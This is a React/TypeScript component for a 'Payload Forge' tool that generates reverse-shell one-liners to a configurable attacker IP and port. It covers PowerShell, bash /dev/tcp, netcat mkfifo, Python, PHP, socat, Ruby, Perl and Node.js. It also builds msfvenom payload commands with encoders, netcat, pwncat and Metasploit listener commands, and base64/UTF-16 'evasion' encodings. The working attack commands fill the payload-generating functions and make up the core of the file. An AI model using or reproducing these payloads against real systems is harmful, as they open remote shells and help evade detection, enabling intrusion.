import React, { useState } from 'react';
import { Terminal, Copy, Check, Shield, Flame, Sliders, RefreshCw, Cpu, Layers, Sparkles } from 'lucide-react';
import { soundEngine } from '../../../services/soundEffects';

interface PayloadForgeAppProps {
  windowId: string;
  isActive: boolean;
  onClose: () => void;
}

export const PayloadForgeApp: React.FC<PayloadForgeAppProps> = () => {
  const [lhost, setLhost] = useState('192.168.100.5');
  const [lport, setLport] = useState('4444');
  const [activeTab, setActiveTab] = useState<'shells' | 'msfvenom' | 'evasion' | 'listener'>('shells');
  
  // Shell Generator State
  const [shellLanguage, setShellLanguage] = useState<'bash' | 'nc' | 'python' | 'php' | 'powershell' | 'socat' | 'ruby' | 'perl' | 'nodejs'>('powershell');
  const [shellVariant, setShellVariant] = useState<string>('standard');
  
  // Msfvenom State
  const [msfPlatform, setMsfPlatform] = useState<'linux' | 'windows' | 'php' | 'java'>('windows');
  const [msfPayload, setMsfPayload] = useState('meterpreter/reverse_tcp');
  const [msfFormat, setMsfFormat] = useState('exe');
  const [msfEncoder, setMsfEncoder] = useState('x86/shikata_ga_nai');
  const [msfIterations, setMsfIterations] = useState(3);

  // Evasion State
  const [encoding, setEncoding] = useState<'none' | 'base64' | 'url' | 'hex' | 'utf16' | 'rot13'>('none');
  const [copied, setCopied] = useState(false);

  // Shell Generators
  const getRawShell = () => {
    switch (shellLanguage) {
      case 'powershell':
        return `powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("${lhost}",${lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`;
      case 'bash':
        return `bash -i >& /dev/tcp/${lhost}/${lport} 0>&1`;
      case 'nc':
        return `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${lhost} ${lport} >/tmp/f`;
      case 'python':
        return `python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${lhost}",${lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'`;
      case 'php':
        return `php -r '$sock=fsockopen("${lhost}",${lport});exec("/bin/sh -i <&3 >&3 2>&3");'`;
      case 'socat':
        return `socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:${lhost}:${lport}`;
      case 'ruby':
        return `ruby -rsocket -e'f=TCPSocket.open("${lhost}",${lport}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`;
      case 'perl':
        return `perl -e 'use Socket;$i="${lhost}";$p=${lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`;
      case 'nodejs':
        return `node -e 'const net=require("net"),cp=require("child_process"),sh=cp.spawn("/bin/sh",[]);const client=new net.Socket();client.connect(${lport},"${lhost}",()=>{client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});'`;
      default:
        return '';
    }
  };

  const getMsfvenomCommand = () => {
    const p = msfPlatform === 'windows' ? `windows/x64/${msfPayload}` : msfPlatform === 'linux' ? `linux/x64/${msfPayload}` : `${msfPlatform}/${msfPayload}`;
    return `msfvenom -p ${p} LHOST=${lhost} LPORT=${lport} -e ${msfEncoder} -i ${msfIterations} -f ${msfFormat} -o payload.${msfFormat}`;
  };

  const getListenerCommand = () => {
    return `# Netcat Listener:\nrlwrap nc -lvnp ${lport}\n\n# Pwncat C2 Listener (Automated PrivEsc / Stabilize):\npwncat-cs -lp ${lport}\n\n# Metasploit Multi-Handler:\nmsfconsole -q -x "use exploit/multi/handler; set PAYLOAD ${msfPlatform === 'windows' ? 'windows/x64/meterpreter/reverse_tcp' : 'linux/x64/meterpreter/reverse_tcp'}; set LHOST ${lhost}; set LPORT ${lport}; exploit"`;
  };

  const applyEncoding = (raw: string) => {
    if (encoding === 'base64') {
      const b64 = btoa(raw);
      return shellLanguage === 'powershell' ? `powershell -EncodedCommand ${b64}` : `echo "${b64}" | base64 -d | bash`;
    }
    if (encoding === 'url') {
      return encodeURIComponent(raw);
    }
    if (encoding === 'hex') {
      return raw.split('').map(c => '\\x' + c.charCodeAt(0).toString(16).padStart(2, '0')).join('');
    }
    if (encoding === 'utf16') {
      // PowerShell UTF16LE base64
      let utf16Str = '';
      for (let i = 0; i < raw.length; i++) {
        utf16Str += raw.charAt(i) + '\0';
      }
      return `powershell -EncodedCommand ${btoa(utf16Str)}`;
    }
    return raw;
  };

  const currentPayloadText = activeTab === 'msfvenom' 
    ? getMsfvenomCommand() 
    : activeTab === 'listener' 
      ? getListenerCommand() 
      : applyEncoding(getRawShell());

  const handleCopy = () => {
    soundEngine.playClick();
    navigator.clipboard.writeText(currentPayloadText);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  return (
    <div className="h-full flex flex-col p-4 bg-[#09070e] text-zinc-200 font-sans">
      {/* Target & Listener Configuration */}
      <div className="grid grid-cols-2 gap-3 pb-3 mb-3 border-b border-white/10">
        <div>
          <label className="text-[11px] font-mono text-zinc-400 block mb-1">LHOST (Attacker VPN / Tun0 IP)</label>
          <input
            type="text"
            value={lhost}
            onChange={(e) => setLhost(e.target.value)}
            className="w-full px-3 py-1.5 rounded-xl bg-black/60 border border-white/10 text-xs font-mono text-white focus:outline-none focus:border-red-500"
          />
        </div>
        <div>
          <input
            type="text"
            value={lport}
            onChange={(e) => setLport(e.target.value)}
            className="w-full px-3 py-1.5 rounded-xl bg-black/60 border border-white/10 text-xs font-mono text-white focus:outline-none focus:border-red-500"
          />
        </div>
      </div>

      {/* Tabs */}
      <div className="flex items-center gap-2 pb-2 mb-2 border-b border-white/5 font-mono text-xs">
        {(['shells', 'msfvenom', 'evasion', 'listener'] as const).map(tab => (
          <button
            key={tab}
            onClick={() => { soundEngine.playClick(); setActiveTab(tab); }}
            className={`px-3 py-1 rounded-lg uppercase tracking-wider text-[11px] font-bold transition-all ${
              activeTab === tab ? 'bg-red-500/20 text-red-400 border border-red-500/30' : 'text-zinc-500 hover:text-zinc-300'
            }`}
          >
            {tab}
          </button>
        ))}
      </div>

      {/* Tab Controls */}
      {activeTab === 'shells' && (
        <div className="flex flex-wrap gap-1.5 mb-3 font-mono text-xs">
          {(['powershell', 'bash', 'nc', 'python', 'php', 'socat', 'ruby', 'perl', 'nodejs'] as const).map((lang) => (
            <button
              key={lang}
              onClick={() => {
                soundEngine.playClick();
                setShellLanguage(lang);
              }}
              className={`px-2.5 py-1 rounded-lg uppercase font-bold transition-all text-[11px] ${
                shellLanguage === lang
                  ? 'bg-red-500/20 text-red-300 border border-red-500/50 shadow-[0_0_12px_rgba(239,68,68,0.25)]'
                  : 'bg-black/40 text-zinc-400 border border-white/5 hover:border-white/20'
              }`}
            >
              {lang}
            </button>
          ))}
        </div>
      )}

      {activeTab === 'msfvenom' && (
        <div className="grid grid-cols-4 gap-2 mb-3 font-mono text-xs">
          <div>
            <label className="text-[10px] text-zinc-500 block mb-1">PLATFORM</label>
            <select
              value={msfPlatform}
              onChange={(e) => setMsfPlatform(e.target.value as any)}
              className="w-full bg-black/60 border border-white/10 rounded-lg px-2 py-1 text-zinc-200"
            >
              <option value="windows">Windows (x64)</option>
              <option value="linux">Linux (x64)</option>
              <option value="php">PHP Web</option>
              <option value="java">Java WAR</option>
            </select>
          </div>
          <div>
            <label className="text-[10px] text-zinc-500 block mb-1">FORMAT</label>
            <select
              value={msfFormat}
              onChange={(e) => setMsfFormat(e.target.value)}
              className="w-full bg-black/60 border border-white/10 rounded-lg px-2 py-1 text-zinc-200"
            >
              <option value="exe">.exe</option>
              <option value="elf">.elf</option>
              <option value="raw">Raw Shellcode</option>
              <option value="war">.war</option>
              <option value="aspx">.aspx</option>
            </select>
          </div>
          <div>
            <label className="text-[10px] text-zinc-500 block mb-1">ENCODER</label>
            <select
              value={msfEncoder}
              onChange={(e) => setMsfEncoder(e.target.value)}
              className="w-full bg-black/60 border border-white/10 rounded-lg px-2 py-1 text-zinc-200"
            >
              <option value="x86/shikata_ga_nai">Shikata_Ga_Nai</option>
              <option value="x64/xor">x64/xor</option>
              <option value="none">None</option>
            </select>
          </div>
          <div>
            <label className="text-[10px] text-zinc-500 block mb-1">ITERATIONS</label>
            <input
              type="number"
              value={msfIterations}
              onChange={(e) => setMsfIterations(Number(e.target.value))}
              className="w-full bg-black/60 border border-white/10 rounded-lg px-2 py-1 text-zinc-200"
            />
          </div>
        </div>
      )}

      {activeTab === 'evasion' && (
        <div className="flex flex-wrap gap-2 mb-3 font-mono text-xs">
          {(['none', 'base64', 'url', 'hex', 'utf16', 'rot13'] as const).map(enc => (
            <button
              key={enc}
              onClick={() => { soundEngine.playClick(); setEncoding(enc); }}
              className={`px-3 py-1 rounded-lg uppercase text-[11px] font-bold ${
                encoding === enc ? 'bg-amber-500/20 text-amber-300 border border-amber-500/40' : 'bg-black/40 text-zinc-400 border border-white/5'
              }`}
            >
              {enc}
            </button>
          ))}
        </div>
      )}

      {/* Output Header & Action */}
      <div className="flex items-center justify-between pb-1 text-xs font-mono text-zinc-400">
        <span className="uppercase text-[10px] text-zinc-500">Generated Directive Payload</span>
        <button
          onClick={handleCopy}
          className="flex items-center gap-1.5 px-3 py-1 rounded-lg bg-red-500/20 hover:bg-red-500/30 text-red-300 border border-red-500/40 text-xs font-bold transition-all shadow-[0_0_12px_rgba(239,68,68,0.25)]"
        >
          {copied ? <Check className="w-3.5 h-3.5 text-emerald-400" /> : <Copy className="w-3.5 h-3.5" />}
          <span>{copied ? 'Copied Payload!' : 'Copy to Clipboard'}</span>
        </button>
      </div>

      {/* Generated Code Area */}
      <div className="flex-1 overflow-auto rounded-xl bg-black/80 border border-white/10 p-3.5 font-mono text-xs text-red-300 select-all whitespace-pre-wrap leading-relaxed custom-scrollbar">
        {currentPayloadText}
      </div>
    </div>
  );
};
